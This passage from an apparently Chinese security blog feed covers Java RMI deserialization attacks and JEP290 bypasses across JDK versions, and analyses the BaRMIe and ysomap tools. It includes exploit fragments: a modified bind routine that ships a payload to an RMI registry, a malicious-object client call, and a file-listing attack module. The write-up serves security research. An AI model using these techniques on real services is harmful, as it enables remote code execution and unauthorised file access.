class="comment">//这里还是正常的readObject</span></span><br><span class="line">   &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException | ClassCastException var78) &#123;</span><br><span class="line">       var7.discardPendingRefs();</span><br><span class="line">       <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">"error unmarshalling arguments"</span>, var78);</span><br><span class="line">   &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">       var7.releaseInputStream();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>发现bind中还是有可以反序列化的点的。但是这又回到了原来的问题：</p><p>bind由于<code>RegistryImpl.checkAccess(&quot;Registry.bind&quot;);</code>这句话在8u141之后有注册端地址校验限制，我们之前也是想要绕过8u141的限制所以转战lookup。（同时rebind也一样）</p><p>那么我们可不可以接受IP限制，假设场景：RMI服务器与RMI注册端分离，我们获取了一台对方内网的RMI服务器然后去利用RMI反序列化攻击RMI注册端，是否在8u241的版本下可行呢？</p><ol><li>使用bind通讯</li><li>使用An Trinh的UnicastRemoteObject链</li><li>由于使用到UnicastRemoteObject对象这就需要修改bind的底层协议使UnicastRemoteObject对象内容不会被覆盖，这就需要修改bind通讯。（在 绕过序列化过程中的替换使所有类均可用于攻击 一节中提到）</li></ol><p>选取ysomap作为poc构造工具，参考lookup重构一个bind协议：</p><p><code>ysomap.core.exploit.rmi.component.Naming</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title">bind</span><span class="params">(Registry registry,String name, Object obj)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//..一致</span></span><br><span class="line">        java.rmi.server.RemoteCall call = ref.newCall((java.rmi.server.RemoteObject) registry, operations, <span class="number">0</span>, interfaceHash);<span class="comment">//修改为0，bind接口编号</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.io.ObjectOutput out = call.getOutputStream();</span><br><span class="line">                <span class="comment">//反射修改enableReplace，处理覆盖问题</span></span><br><span class="line">                ReflectionHelper.setFieldValue(out, <span class="string">"enableReplace"</span>, <span class="keyword">false</span>);</span><br><span class="line">                out.writeObject(name);<span class="comment">//随便写</span></span><br><span class="line">                out.writeObject(obj); <span class="comment">// payload</span></span><br><span class="line">            <span class="comment">//..</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>然后修改<code>ysomap.core.exploit.rmi.RMIRegistryExploit</code>里面<code>Naming.lookup(registry, remote);</code>为<code>Naming.bind(registry, name,remote);</code></p><p>尝试攻击8u241</p><p>(失败的图找不到了，反正就是没有命令执行啦)</p><p>华丽失败</p><h3 id="8u241的修复第二处"><a href="#8u241的修复第二处" class="headerlink" title="8u241的修复第二处"></a>8u241的修复第二处</h3><p>好吧，肯定是哪里有问题，0day就这样没了（狗头）。</p><p>问题在于8u241还修复了调用栈中的<code>java.rmi.server.RemoteObjectInvocationHandler#invokeRemoteMethod</code>方法。（复用调用栈的图，第三行）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jj8ahcj31tt0spqih.jpg" alt="另一种绕过JEP290-1.png"></p><p>对比下8u231和8u241：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jqcprij32bc0j377m.jpg" alt="另一种绕过JEP290-bind修复第二处.png"></p><p>添加了一处针对传入method的验证。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg17jwlsnjj31hi11agqx.jpg" alt="另一种绕过JEP290-bind修复第二处-调试.png"></p><p>这个的method是从<code>sun.rmi.transport.tcp.TCPEndpoint#newServerSocket</code>的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ServerSocket var2 = ((RMIServerSocketFactory)var1).createServerSocket(<span class="keyword">this</span>.listenPort);</span><br></pre></td></tr></table></figure><p>由于动态代理特性过来的，method就是createServerSocket这个方法，然而它理所当然不是一个remote接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">RMIServerSocketFactory</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ServerSocket <span class="title">createServerSocket</span><span class="params">(<span class="keyword">int</span> port)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IOException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以即使我们用bind绕过第一个修复，还是被第二个修复处给干掉了。</p><p>假如要硬趟着修复点过去，必须在UnicastRemoteObject的invoke的调用栈中，找到一个可控的同时方法还是remote的地方，再把它接到RemoteObjectInvocationHandler的invoke方法，从而满足这个修复点的验证。</p><p>太难，太难。</p><p>至此8u241之后针对RMI服务的反序列化攻击，就GG了……</p><h2 id="小结-amp-总结"><a href="#小结-amp-总结" class="headerlink" title="小结&amp;总结"></a>小结&amp;总结</h2><p>针对利用JRMP反序列化绕过JEP290-bind：</p><ol><li>反序列化打服务端，可以使用一个服务端不存在的类。在这个服务端不存在的类的变量中放入payload，这个payload会在服务端反序列化这个不存在的类的时候触发，虽然会报错，但是会触发。</li><li>指出了<a href="[http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/](http://www.codersec.net/2018/09/一次攻击内网rmi服务的深思/">bsmali4师傅的文</a>)中关于UnicastRemoteObject类不能用是因为ref属性为transient的错误。（在动态代理-RemoteObjectInvocationHandler一节中）</li><li>在利用JRMP反序列化绕过JEP290的Ysoserial的实现中，利用RemoteObjectInvocationHandler仍然使用动态代理是非必要的。</li><li>在利用JRMP反序列化绕过JEP290的Ysoserial的实现，利用服务端不存在的自定义的InvocationHandler是可行的。</li></ol><p>针对利用JRMP反序列化绕过JEP290-lookup：</p><ol><li>利用lookup，绕过了8u141的限制，从而真正完成了JEP290的版本绕过</li></ol><p>来自An Trinh的另一种绕过JEP290的思路：</p><ol><li>利用RemoteObjectInvocationHandler完全不同的触发点，绕过了8u231的修复，被8u241阻止了为所欲为。</li></ol><p><strong>最后总结</strong>：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="总结图.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>认真看了很多老哥的博客，先给全员点个赞：</p><p>写到一半的时候发现总体文章框架是跟<a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">attacking-java-rmi-services-after-jep-290</a>雷同的，原来我想写的已经有人做过了，想想当作这篇文章详细版本好了，但是到后面发现还是发现了一些别人没有记录下来或没有细说的东西，比如自定义类，lookup绕过等。</p><p>在文章后半部分还大量参考了<a href="https://blog.0kami.cn/2020/02/06/rmi-registry-security-problem/" target="_blank" rel="noopener">0kami的研究结果</a>和<a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">An Trinh的绕过方式</a>，膜拜。</p><p>此外<a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">paper这篇</a>在第三点RMI的动态加载、第四点JNDI注入都花了比较多的笔墨，但是在对于第二点RMI服务端的反序列化攻击中，讨论了<strong>RMI客户端–攻击–&gt;RMI服务端</strong>的情况，同时也是要求RMI服务端必须提供一个输入参数为Object的方法，客户端调用这个方法传入Object的payload。此外将RMI<strong>客户端–通过lookup攻击–&gt;RMI注册端</strong>的情况点了一下（也就是我忽略了的注册端）。</p><p><a href="https://xz.aliyun.com/t/7079" target="_blank" rel="noopener">threedr3am第一篇</a>讲述了JNDI注入、<strong>RMI服务端—通过bind攻击–RMI注册端</strong>，导致RMI注册端被RCE（此处他文章中的标题与讲述内容不符，应该是标题写错了），JRMP的客户端与服务端攻击。</p><p><a href="https://xz.aliyun.com/t/7264" target="_blank" rel="noopener">threedr3am第二篇</a>细节分析了<strong>RMI客户端—通过lookup攻击–RMI注册端</strong>（以及注册端回打客户端）、<strong>RMI服务端—通过bind攻击–RMI注册端</strong>，点了一下<strong>RMI客户端—通过替换参数攻击–RMI服务端</strong>，重新分析了下JNDI注入关于Reference远程对象的细节（这里可能会出现误解，攻击场景是我们控制一个RMI服务端，我们要让RMI客户端（受害者）主动来<code>new InitialContext().lookup</code>我们，这个lookup与RMI客户端查询RMI注册端的lookup不一样【前者的lookup=后者的lookup查询+会触发漏洞的解析过程】，最后导致客户端被RCE）、打注册端时在8u121之后的JDK存在黑名单，出现Yso-RMIClient、再是JNDI注入绕过。</p><p><a href="https://www.anquanke.com/post/id/200860" target="_blank" rel="noopener">afanti的Bypass JEP290攻击rmi</a>与<a href="https://mp.weixin.qq.com/s/TbaRFaAQlT25ASmdTK_UOg" target="_blank" rel="noopener">0c0c0f的RMI漏洞的另一种利用方式</a>实际都是讲述了客户端攻击服务端解析参数时绕过Object的方法</p><p><a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a></p><p>译文：<a href="https://nosec.org/home/detail/2541.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2541.html</a></p><p><a href="https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2020/02/an-trinhs-rmi-registry-bypass/</a></p><p><a href="https://paper.seebug.org/1091/" target="_blank" rel="noopener">https://paper.seebug.org/1091/</a></p><p><a href="http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/" target="_blank" rel="noopener">http://www.codersec.net/2018/09/%E4%B8%80%E6%AC%A1%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91rmi%E6%9C%8D%E5%8A%A1%E7%9A%84%E6%B7%B1%E6%80%9D/</a></p><p><a href="https://www.anquanke.com/post/id/204740" target="_blank" rel="noopener">https://www.anquanke.com/post/id/204740</a></p><p><a href="https://www.anquanke.com/post/id/197829" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197829</a></p><p><a href="https://www.anquanke.com/post/id/199481" target="_blank" rel="noopener">https://www.anquanke.com/post/id/199481</a></p><p><a href="https://blog.csdn.net/leehdsniper/article/details/71599504" target="_blank" rel="noopener">https://blog.csdn.net/leehdsniper/article/details/71599504</a></p><p><a href="http://www.hayasec.me/2018/03/21/java-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E9%97%B2%E8%B0%88/" target="_blank" rel="noopener">http://www.hayasec.me/2018/03/21/java-rmi%E5%8F%8D%E5%BA%8F%E5%88%97%E9%97%B2%E8%B0%88/</a></p><p><a href="https://www.anquanke.com/post/id/85681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85681</a></p><p><a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/214096.html</a></p><p><a href="https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html" target="_blank" rel="noopener">https://www.apiref.com/java11-zh/java.rmi/java/rmi/dgc/DGC.html</a></p><p><a href="https://xz.aliyun.com/t/2651" target="_blank" rel="noopener">https://xz.aliyun.com/t/2651</a></p><p><a href="https://xz.aliyun.com/t/2650" target="_blank" rel="noopener">https://xz.aliyun.com/t/2650</a></p><p><a href="https://xz.aliyun.com/t/2649" target="_blank" rel="noopener">https://xz.aliyun.com/t/2649</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;字数：1w5&lt;/p&gt;
&lt;p&gt;推荐阅读时间：&amp;gt;2h&lt;/p&gt;
&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;再看下RMI反序列化攻击的总结图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;
      
    
    </summary>
    
    
      <category term="java" scheme="http://lalajun.com/tags/java/"/>
    
      <category term="rmi" scheme="http://lalajun.com/tags/rmi/"/>
    
  </entry>
  
  <entry>
    <title>RMI-反序列化-深入-上</title>
    <link href="http://lalajun.com/2020/06/22/RMI%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E6%B7%B1%E5%85%A5-%E4%B8%8A/"/>
    <id>http://lalajun.com/2020/06/22/RMI 反序列化-深入-上/</id>
    <published>2020-06-22T09:05:33.000Z</published>
    <updated>2020-06-24T03:05:18.834Z</updated>
    
    <content type="html"><![CDATA[<p>字数：1w6</p><p>推荐阅读时间：&gt;2h</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>其实起因听老哥讲<strong>“shiro-721可以用JRMP的payload，短很多，1分钟就可以跑出来”</strong>，啊！JRMP，RMI学过，我会的我会的…….实际上我会个锤子，YSO-JRMP的模块根本没用过。</p><blockquote><p>但实际上本文只是顺道解决了这个问题，如果只是想知道这个原理，可以到下篇的 JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener) 中去解答这个疑问，利用方式是同理的。</p></blockquote><p>然后有一天看了一波别人攻击RMI服务的工具，瞬间三观崩坏，打脸piapia响！</p><p>于是…..花了按照月为单位的很长时间洋洋洒洒写了3w字的文整理了针对RMI服务的9种攻击方式，长文少有人能看下去，先丢上最终的研究的结果吧。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg378mdwp2j31ut18015j.jpg" alt="总结图.png"></p><p>如果觉得有什么出入，喷就完事了；<br>同时觉得本文对你有帮助，<del>也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播吃…..</del></p><p>咳。同时由于文章实在过长，图片多达74张，将全文分为上、下两篇。</p><p>在上篇中将讲述<strong>针对已知RMI接口的三种攻击方式</strong>与<strong>针对RMI层（RMI注册端、RMI服务端）/DGC层</strong>，是对已有常见利用方式的总结。</p><p>而在下篇中将重点讲述<strong>绕过JEP290的引入JRMP的利用方式</strong>，这就很好玩了，指出了别的老哥的错误之处，找到了别人没提及的骚姿势，复现分析了老外的绕过方式。</p><p>上下篇的小结论是沿用的，建议配合食用；文中实验代码、环境及工具均已上传<a href="https://github.com/lalajun/RMIDeserialize" target="_blank" rel="noopener">github</a>。</p><p>此外安利下<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>，如果没有意外的话，之后会陆续把这些攻击方式都移植过去。</p><h2 id="回顾稚嫩的过去"><a href="#回顾稚嫩的过去" class="headerlink" title="回顾稚嫩的过去"></a>回顾稚嫩的过去</h2><p>在学习了一整子之后回过头去看之前对于RMI的理解真是片面啊……<br>在 RMI 反序列化一文中，我们把RMI服务的攻击维度分成四个方向：</p><ol><li>探测利用开放的RMI服务</li><li>基于RMI服务反序列化过程的攻击</li><li>利用RMI的动态加载特性的攻击利用</li><li>结合JNDI注入</li></ol><blockquote><p>我个人推荐把第一、第二方向与第三、第四个方向隔离开讨论与理解，第二个点是标准反序列化利用套路（readobject入口点+利用链+RCE）。同第一个一样都是针对RMI服务进行攻击，即打一个1099端口。</p><p>而第三、第四个点则是想办法让对方服务器加载我们的恶意类，在对方服务器上实例化的时候执行恶意的构造函数或静态方法等（JNDI由于代码还可以执行另一个方法，这里不多说了）</p><p><strong>我们在本文中只专注讨论剖析 探测利用开放的RMI服务、基于RMI服务反序列化过程的攻击</strong></p></blockquote><p>我们对于<strong>1.探测利用开放的RMI服务</strong>简单纸上谈兵了一下：可能存在可以利用的随便写入文件的类啦巴拉巴拉。</p><p>同时简单复现了其中的<strong>2.基于RMI服务反序列化过程</strong>的攻击：</p><p>在起一个有CC利用链（Commons-Collections）的RMI服务端之后，我们将服务端提供的服务的接口参数设置成Object类型（因为我们的payload就是Object对象）然后再拿这个object的payload去打提供服务的RMI服务端，成功。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">User userClient = (User)Naming.lookup(url);</span><br><span class="line">userClient.say(<span class="string">"world"</span>);</span><br><span class="line">userClient.dowork(getpayload());</span><br><span class="line"><span class="comment">//dowaok接受一个Object函数，这时候我们传入恶意object会在对方服务器readobject反序列化</span></span><br></pre></td></tr></table></figure><p>于是那时候总结就是，如果RMI服务端可以被攻击成功需要：</p><ol><li>服务端提供一个RMI服务，提供的RMI服务的方法的参数必须为Object（因为我们的payload是Object）</li><li>服务端有可以被利用的反序列化利用链及环境</li></ol><p>于是就觉得辣鸡漏洞，还需要对方提供一个Object的对象来把自己的payload对着这个Object点塞进去才行。实际情况咋可能，垃圾。</p><p>实际上，对于之前讨论的：</p><ol><li>我们没有对探测利用开放的RMI服务进行进一步探究，到底是怎么探测的？</li><li>RMI客户端打RMI服务端我们知道需要一个Object接口，但是我们是可以查询到这个接口是不是有Object参数，然后真的就条件这么苛刻，没有其他办法了么？</li><li>之前的分析，完全忽略了<strong>RMI注册端</strong>的情况。</li><li>之前的分析，完全片面理解了针对RMI服务的攻击，实际上还有很多利用方式和细节，简直管中窥豹。</li><li>我们没有继续分析相应的利用工具的使用以及实现细节。</li><li>我们没有继续分析在JDK版本更新中对于封堵的绕过情况</li></ol><p>这是一长串的一环套着一环的疑问，</p><p>我们先来解决第一个问题 <strong>探测利用开放的RMI服务到底是个怎样攻击的流程</strong>。</p><h2 id="探测利用开放的RMI服务"><a href="#探测利用开放的RMI服务" class="headerlink" title="探测利用开放的RMI服务"></a>探测利用开放的RMI服务</h2><p>之前我们讲到探测利用开放的RMI服务，使用工具<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a>去寻找可受攻击的RMI服务，比如可能提供了文件上传等危险功能，一种就跟普通web测试差不多的很简单的感觉。</p><p>但实际上我们要调用一个存在危险功能的RMI服务端需要知道：RMI对象<strong>a</strong>、方法<strong>b</strong>、参数<strong>c</strong>，即<code>a.b(c)</code></p><p>自然会认为我们作为RMI客户端向RMI注册端查询有哪些RMI服务端，然后再去RMI服务端查询接口和参数，再根据返回的接口和参数，构造利用就好了。</p><p>但是回忆一下在上一篇中讲述的RMI通讯流程，好像压根就没有RMI客户端向RMI服务端查询接口（方法和参数）的这一步骤，都是本地写一个一模一样的接口然后直接调用的。</p><p>那么我们得不到方法和参数，实际上是不是根本就没有探测利用开放的RMI服务利用这么一说呢？</p><p>我们来看<strong>BaRMIe工具</strong>是怎么做的。</p><h3 id="BaRMIe"><a href="#BaRMIe" class="headerlink" title="BaRMIe"></a>BaRMIe</h3><p>先分析下这个工具——<a href="https://github.com/NickstaDB/BaRMIe" target="_blank" rel="noopener">BaRMIe</a>。工具提供了两种利用模式——<code>enum</code>枚举模式，<code>attack</code>攻击模式。</p><p>Github下载源码，然后Debug一下这个工具，idea使用<strong>listen to remote JVM</strong>的形式进行调试。</p><p>idea端：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16qg4vw0j31h215qdja.jpg" alt="barmie调试.png"></p><p>源码处下断点，复制图中那个Command line，然后删掉&lt;&gt;可选，命令行运行比如：</p><p><code>java -agentlib:jdwp=transport=dt_socket,server=n,address=LAPTOP-50N17D1J:5005,suspend=y -jar BaRMIe.jar -enum 127.0.0.1 1099</code></p><p>就可以调试了。（复制过去是不行的因为address不一样）</p><p>看enum枚举模式。入口在<code>nb.barmie.modes.enumeration.EnumerationTask#run</code></p><p>代码不复杂就不大篇幅注解了，主要分为几步，直接总结下：</p><p><strong>第一步</strong>：<code>ep = this._enumerator.enumerateEndpoint(this._target);</code></p><p>作为RMI客户端向RMI注册端获取RMI服务端信息，这里叫做Endpoint，并分析Endpoint是RMI服务端</p><ol><li><code>LocateRegistry.getRegistry</code>获取目标IP端口的RMI注册端</li><li><code>reg.list()</code>获取注册端上所有服务端的Endpoint对象</li><li>使用<code>reg.unbind(unbindName);</code>解绑一个不存在的RMI服务名，根据报错信息来判断我们当前IP是否可以操控该RMI注册端（如果可以操控，意味着我们可以解绑任意已经存在RMI服务，但是这只是破坏，没有太大的意义，就算bind一个恶意的服务上去，调用它，也是在我们自己的机器上运行而不是RMI服务端）</li><li>本地起一个代理用的RMI注册端，用于转发我们对于目标RMI注册端的请求（在RaRMIe中，通过这层代理用注册端可以变量成payload啥的，算是一层封装；在这里用于接受原始回应数据，再进行解析）</li><li>通过代理服务器<code>reg.lookup(objectNames[i]);</code>遍历之前获取的所有服务端的Endpoint。</li><li>通过代理服务器得到lookup返回的源数据，自行解析获取对应对象相应的类细节。（因为直接让他自动解析是不会有响应的类信息的）</li></ol><p>至此就获取了如下信息，可以看到会解析出RMI服务端的类名等等。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rfprkrj30zq0btmzf.jpg" alt="barmie-part1.png"></p><p>如果这些信息都获取成功，就会判定为这个端口是一个注册端，否则觉得这个不是注册端，输出</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rqsevuj30x603daan.jpg" alt="barmie-part2.png"></p><p>但是实际上你一个根本没开的端口扫描结果也会跟你说是一个RMI服务接口，随便看看就好了，相当于失败了。</p><p><strong>第二步</strong>：<code>attacks = RMIAttackFactory.findAttacksForEndpoint(ep);</code>：</p><p>对于所有Endpoint（RMI服务端）进行遍历，再一一调用攻击模块判断是否可以攻击。</p><p>攻击模块如下：</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1gg16rvgizxj30k00e8gm7.jpg" alt="attack模块.png"></p><p>在看完代码后，我把他们根据攻击类型划分如下：</p><ol><li>RMI客户端探测利用RMI服务：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Axiom</span><br><span class="line">-DeleteFile</span><br><span class="line">-ListFiles</span><br><span class="line">-ReadFile</span><br><span class="line">-WriteFile</span><br></pre></td></tr></table></figure><ol start="2"><li>RMI客户端反序列化攻击RMI服务端——利用Object类型参数（RMI服务端提供的对象的方法参数有一个是Obejct类型）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java</span><br><span class="line">-JmxDeser</span><br><span class="line">SpringFramework</span><br><span class="line">-RmiInvocationHandlerDeser</span><br><span class="line">-Spring2RmilnvocationHandlerDeser</span><br></pre></td></tr></table></figure><ol start="3"><li>RMI服务端攻击RMI注册端——Bind类攻击</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Java</span><br><span class="line">-IllegalRegistryBind</span><br></pre></td></tr></table></figure><p>以上当然这就有超出了探测利用RMI服务以外的类型，我们先划分出来。看看调用攻击模块之后做了什么，再回过头一个个分析攻击模块。</p><p><strong>第三步</strong>：<code>deserPayloads = DeserPayloadFactory.findGadgetsForEndpoint(ep);</code></p><p>对于所有Endpoint（RMI服务端）进行遍历，尝试判断是否存在反序列化利用链。</p><ol><li>其判断的原理大概是，判断RMI注册端提供的RMI服务端的对象class（如：com.lala.User）的路径中（不是非常确定？)，是否包含存在已知反序列化利用链的jar包。</li></ol><p>这是一个比较不靠谱的判断是否存在反序列化利用链的方法，反正我靶机中服务端有CC利用链，但是无法探测到。</p><p>其中工具中已知反序列化利用链的jar包类别如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollectionsPayload</span><br><span class="line">GroovyPayload</span><br><span class="line">JBossInterceptorsPayload</span><br><span class="line">ROMEPayload</span><br><span class="line">RhinoPayload</span><br></pre></td></tr></table></figure><h3 id="看看探测利用开放的RMI服务的攻击模块是怎么实现的"><a href="#看看探测利用开放的RMI服务的攻击模块是怎么实现的" class="headerlink" title="看看探测利用开放的RMI服务的攻击模块是怎么实现的"></a>看看探测利用开放的RMI服务的攻击模块是怎么实现的</h3><p>4个攻击模块Delete、List、Read、Write都是针对AxiomSL这个组件。看一个List的。</p><p>描述：AxiomSL公开一个对象FileBrowserStub，它有一个list files（）方法，该方法返回给定目录中的文件列表。</p><p>在判断是否存在漏洞时会去判断RMI服务返回的对象的class栈中是否存在以下class路径：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">axiomsl.server.rmi.FileBrowserStub</span><br></pre></td></tr></table></figure><p>判断存在该class路径后，再进行利用；实际利用代码也很简单，就是普通的RMI服务调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//nb.barmie.modes.attack.attacks.Axiom.ListFiles#executeAttack</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">executeAttack</span><span class="params">(RMIEndpoint ep)</span> <span class="keyword">throws</span> BaRMIeException </span>&#123;</span><br><span class="line"><span class="comment">//一些参数设定</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//用户输入一个想要列出的文件目录</span></span><br><span class="line">path = <span class="keyword">this</span>.promptUserForInput(<span class="string">"Enter a path to list files from: "</span>, <span class="keyword">false</span>);</span><br><span class="line">System.out.println(<span class="string">""</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//向eq（RMI服务端）lookup一个FileBrowserStub对象</span></span><br><span class="line">    <span class="comment">//同时本地也写好了FileBrowserStub接口</span></span><br><span class="line">System.out.println(<span class="string">"[~] Getting fileBrowser object..."</span>);</span><br><span class="line">fbs = (FileBrowserStub)<span class="keyword">this</span>.getRemoteObject(ep, <span class="string">"fileBrowser"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用listFilesOnServer方法获取调用结果</span></span><br><span class="line">files = fbs.listFilesOnServer(path);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/***********************************************************</span></span><br><span class="line"><span class="comment"> * FileBrowserStub for AxiomSL attacks.</span></span><br><span class="line"><span class="comment"> **********************************************************/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">interface</span> <span class="title">FileBrowserStub</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> FileInformation[] listFilesOnServer(String paramString) <span class="keyword">throws</span> RemoteException;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">byte</span>[] readFile(String paramString, <span class="keyword">long</span> paramLong, <span class="keyword">int</span> paramInt) <span class="keyword">throws</span> IOException;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">void</span> <span class="title">writeFile</span><span class="params">(String paramString, <span class="keyword">byte</span>[] paramArrayOfByte)</span> <span class="keyword">throws</span> IOException</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">boolean</span> <span class="title">deleteFile</span><span class="params">(String paramString, <span class="keyword">boolean</span> paramBoolean)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> FileInformation <span class="title">getFileInformation</span><span class="params">(String paramString)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那这边也就清楚了，实际上探测利用开放的RMI服务，根本只是攻击者自己知道有哪些组件会提供危险的RMI服务。然后根据class路径去判断对面是否使用了该组件，如果用了就尝试打一打看看成不成功。</p><p>假如对面提供了我们一个不认识的RMI服务，我们是没有能力攻击的。</p><p>就如之前提到的一样：因为我们没有RMI服务对象的接口（方法+参数）。就算对面开放了一个Class名字可疑的服务，我们也没有办法去正确调用它。</p><p>可见这种理论存在但是不怎么被人讨论的攻击方法总是有些鸡肋。</p><h2 id="RMI客户端反序列化攻击RMI服务端"><a href="#RMI客户端反序列化攻击RMI服务端" class="headerlink" 